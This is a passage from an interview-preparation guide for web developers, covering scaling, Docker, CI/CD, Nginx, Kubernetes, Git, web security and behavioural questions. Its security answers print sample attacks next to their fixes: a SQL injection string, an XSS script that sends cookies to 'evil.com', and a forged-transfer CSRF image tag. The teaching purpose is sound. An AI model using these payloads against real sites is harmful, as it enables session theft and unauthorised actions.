Vertical Scaling (Scale Up):        Horizontal Scaling (Scale Out):
+----------+                        +------+ +------+ +------+
| Server   | → bigger machine       | S1   | | S2   | | S3   |
| RAM: 8GB |   RAM: 64GB            +------+ +------+ +------+
+----------+                          ↑ Add more servers
  (has limits)                        (virtually unlimited)
```

| | Vertical | Horizontal |
|--|---------|------------|
| Cost | Expensive hardware | Commodity servers |
| Limit | Physical hardware limit | Nearly unlimited |
| Downtime | Required | Not required |

---

### Q76. What is message queue and when to use it?

**Answer:**  
A message queue **decouples services** by allowing async communication.

```
Without queue:          With queue:
Order → EmailSvc        Order → [Queue] → EmailSvc (processes later)
(if email fails,        (order saved immediately, email retried)
 order might fail too)
```

**Popular:** RabbitMQ, Apache Kafka, AWS SQS, Bull (Node.js)

---

### Q77. What is Docker and why is it used?

**Answer:**  
Docker **packages your app + all dependencies** into a container that runs the same everywhere.

```
Without Docker:          With Docker:
"Works on my machine!"   Dev → Container → Staging → Production
                         (same environment everywhere ✅)
```

```dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
```

---

### Q78. What is CI/CD?

**Answer:**

```
CI (Continuous Integration):
Developer pushes code
     ↓
Automated: tests run, code linted, build tested
     ↓
Merge to main only if all checks pass ✅

CD (Continuous Deployment/Delivery):
After CI passes
     ↓
Automatically deploy to staging/production
     ↓
Always have shippable code
```

**Tools:** GitHub Actions, Jenkins, GitLab CI, CircleCI

---

## DevOps & Deployment

### Q79. What is the difference between `npm run build` and `npm start`?

**Answer:**

| Command | Purpose |
|---------|---------|
| `npm run dev` | Development server with hot reload |
| `npm run build` | Compiles/bundles code for production (optimized) |
| `npm start` | Runs the production build |

---

### Q80. What is a reverse proxy?

**Answer:**  
A reverse proxy sits in front of backend servers and **forwards client requests**.

```
Client → Reverse Proxy (Nginx) → Node.js App (port 3000)
                               → Node.js App (port 3001)
```

**Used for:** Load balancing, SSL termination, caching, serving static files.

Popular: **Nginx**, **Apache**, AWS ALB.

---

### Q81. What is PM2 and why do Node.js apps use it?

**Answer:**  
PM2 is a **process manager for Node.js** — keeps apps alive, restarts on crash.

```bash
pm2 start app.js          # start app
pm2 start app.js -i max   # cluster mode (uses all CPU cores)
pm2 logs                  # view logs
pm2 restart app           # restart app
pm2 monit                 # monitor resources
```

---

### Q82. What are environment-specific configurations?

**Answer:**

```
development:  .env.development
              → DB: localhost, DEBUG: true, hot reload

staging:      .env.staging
              → DB: staging server, test data

production:   .env.production
              → DB: prod server, minified, no logs
```

Tools: `dotenv`, `dotenv-flow`, cloud env vars (AWS Secrets Manager, Heroku Config Vars)

---

### Q83. What is a Dockerfile vs docker-compose?

**Answer:**

```
Dockerfile         → Instructions to build ONE image
docker-compose.yml → Orchestrates MULTIPLE containers

# docker-compose example
services:
  app:
    build: .
    ports: ["3000:3000"]
  db:
    image: mongo
    ports: ["27017:27017"]
  redis:
    image: redis
```

---

### Q84. What is Nginx and how is it commonly used with Node.js?

**Answer:**

```
Client Request
      ↓
Nginx (port 80/443)
  ├─ Static files → Served by Nginx directly (fast)
  └─ API requests → Proxied to Node.js (port 3000)
```

```nginx
server {
  listen 80;
  location / {
    proxy_pass http://localhost:3000;
  }
  location /static/ {
    root /var/www/html;
  }
}
```

---

### Q85. What is Kubernetes (K8s)?

**Answer:**  
Kubernetes **orchestrates Docker containers** at scale — handles deployment, scaling, and self-healing.

```
K8s Cluster:
  Master Node (Control Plane)
        ↓
  Worker Nodes:
  +---------+  +---------+  +---------+
  | Pod     |  | Pod     |  | Pod     |
  | [app]   |  | [app]   |  | [app]   |
  +---------+  +---------+  +---------+
  (auto-restart if crash, scale up/down automatically)
```

---

## Security

### Q86. What is SQL injection and how do you prevent it?

**Answer:**

```sql
-- Attack: User enters: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1';
-- Returns ALL users!
```

**Prevention:**
```js
// ❌ Vulnerable
db.query(`SELECT * FROM users WHERE name = '${userInput}'`);

// ✅ Parameterized query
db.query('SELECT * FROM users WHERE name = ?', [userInput]);
```

---

### Q87. What is XSS (Cross-Site Scripting) and how do you prevent it?

**Answer:**  
XSS attacks **inject malicious scripts** into web pages viewed by other users.

```html
<!-- Attacker inputs this in a comment: -->
<script>document.cookie; fetch('evil.com?c=' + document.cookie)</script>
```

**Prevention:**
- Escape user output (HTML entities)
- Use `Content-Security-Policy` headers
- React escapes JSX by default (`{userInput}` is safe)
- Never use `dangerouslySetInnerHTML` with user data

---

### Q88. What is CSRF and how do you prevent it?

**Answer:**  
CSRF (Cross-Site Request Forgery) tricks a logged-in user into **unknowingly making a request**.

```
User logged into bank.com
Attacker sends email with:
<img src="https://bank.com/transfer?to=attacker&amount=1000">
Browser auto-sends cookies → transfer executes!
```

**Prevention:**
- CSRF tokens (unique per session)
- `SameSite=Strict` cookie attribute
- Check `Origin`/`Referer` headers

---

### Q89. What is bcrypt and why is it used for passwords?

**Answer:**  
bcrypt is a **password hashing function** — slow by design to resist brute force.

```js
const bcrypt = require('bcrypt');

// Hash password
const hashed = await bcrypt.hash('myPassword123', 10); // 10 = salt rounds
// Store hashed in DB

// Verify password
const match = await bcrypt.compare('myPassword123', hashed); // true
```

> ❌ Never store plain text passwords. ❌ MD5/SHA1 are too fast → use bcrypt/argon2.

---

### Q90. What is HTTPS and how does SSL/TLS work?

**Answer:**

```
HTTP  → Data sent as plain text (interceptable)
HTTPS → Data encrypted via TLS

TLS Handshake:
Client → "Hello, I support TLS 1.3"
Server → "OK, here's my certificate"
Client → Verifies certificate
Both   → Exchange keys
Both   → Encrypted communication begins 🔒
```

---

### Q91. What are security headers and what do they do?

**Answer:**

```js
// Using helmet.js in Express
const helmet = require('helmet');
app.use(helmet());
```

| Header | Protection |
|--------|-----------|
| `Content-Security-Policy` | Prevents XSS |
| `X-Frame-Options` | Prevents clickjacking |
| `HSTS` | Forces HTTPS |
| `X-Content-Type-Options` | Prevents MIME sniffing |

---

## Git & Version Control

### Q92. What is the difference between `git merge` and `git rebase`?

**Answer:**

```
git merge:                    git rebase:
main: A-B-C                   main: A-B-C
feature: A-B-D-E              feature: A-B-C-D'-E' (replayed on top)

Creates a merge commit        Linear, clean history
Preserves full history        Rewrites history
```

> ✅ Use `merge` for shared branches, `rebase` for local/feature branches.

---

### Q93. What is `git stash`?

**Answer:**  
`git stash` **temporarily saves** your uncommitted work so you can switch branches.

```bash
git stash           # save current changes
git checkout main   # switch branch
git stash pop       # restore saved changes
git stash list      # see all stashes
```

---

### Q94. What is a Pull Request (PR) workflow?

**Answer:**

```
1. Create feature branch:    git checkout -b feature/user-auth
2. Make commits:             git commit -m "Add login endpoint"
3. Push to remote:           git push origin feature/user-auth
4. Open Pull Request on GitHub
5. Code review by teammates
6. Address feedback, push more commits
7. PR approved → Merge to main
8. Delete feature branch
```

---

### Q95. What is `git cherry-pick`?

**Answer:**  
`git cherry-pick` applies a **specific commit** from one branch to another.

```bash
# Get commit hash from feature branch
git log feature-branch

# Apply just that commit to main
git cherry-pick abc1234

# Use case: hotfix on a specific commit only
```

---

### Q96. What are Git hooks?

**Answer:**  
Git hooks are **scripts that run automatically** on Git events.

```
pre-commit  → run linter/tests before commit
pre-push    → run tests before pushing
commit-msg  → validate commit message format
```

```bash
# .git/hooks/pre-commit
#!/bin/sh
npm run lint && npm test
```

Tools: **Husky** (popular npm package for Git hooks)

---

## General / Behavioral

### Q97. How do you handle a production bug at midnight?

**Answer:**  
**Structured approach:**

```
1. ASSESS    → How severe? What's impacted?
2. CONTAIN   → Rollback to last stable version if needed
3. DIAGNOSE  → Check logs (Sentry, CloudWatch), reproduce locally
4. FIX       → Minimal, focused fix (don't refactor under pressure)
5. DEPLOY    → Test in staging, deploy with monitoring
6. DOCUMENT  → Write post-mortem: what happened, why, how to prevent
```

> Key: Stay calm, communicate status to stakeholders, don't make things worse.

---

### Q98. How do you optimize a slow web application?

**Answer:**

**Frontend:**
- Code splitting / lazy loading
- Image optimization (WebP, lazy load)
- Reduce bundle size (tree shaking)
- Use CDN for static assets
- Cache with Service Workers

**Backend:**
- Add database indexes
- Cache repeated queries (Redis)
- Paginate large data sets
- Optimize N+1 queries
- Connection pooling

**Tools:** Lighthouse, Chrome DevTools, `EXPLAIN` in SQL

---

### Q99. How do you keep up with new technologies?

**Answer (genuine, concise):**
- Follow official docs and changelogs (React, Node, MDN)
- Read engineering blogs (Vercel, Netlify, CSS-Tricks)
- Build small side projects to experiment
- Engage with communities (GitHub, Dev.to, Reddit)
- Focus on fundamentals — frameworks change, concepts don't

---

### Q100. Where do you see yourself in 3 years?

**Answer (framework):**

```
1. Technical growth  → System design, architecture, tech lead skills
2. Team leadership   → Mentoring juniors, leading code reviews
3. Product thinking  → Understanding business impact of tech decisions
4. Specialization OR breadth → Choose your path (specialist vs. generalist)
```

> Tip: Show **ambition** but also show you're **invested in your team and company's growth**, not just your own.

---

## 🎯 Quick Revision Cheat Sheet

```
HTML/CSS      → Box model, Flexbox vs Grid, Responsive design
JS Core       → Closures, Event loop, Promises, async/await, Prototype
React         → Virtual DOM, Hooks, Context, Memo, Lifecycle
Node.js       → Event loop, Middleware, JWT, CORS
Databases     → ACID, Indexes, N+1, SQL vs NoSQL
APIs          → REST methods, Status codes, GraphQL, WebSocket
System Design → Caching, Load balancer, Microservices, CDN
Security      → XSS, CSRF, SQL injection, bcrypt, HTTPS
DevOps        → Docker, CI/CD, Nginx, PM2
Git           → Merge vs Rebase, PR workflow, Hooks
```

---

*Good luck with your interview! 🚀 Remember: it's okay to think out loud — interviewers often value your reasoning process as much as the final answer.*
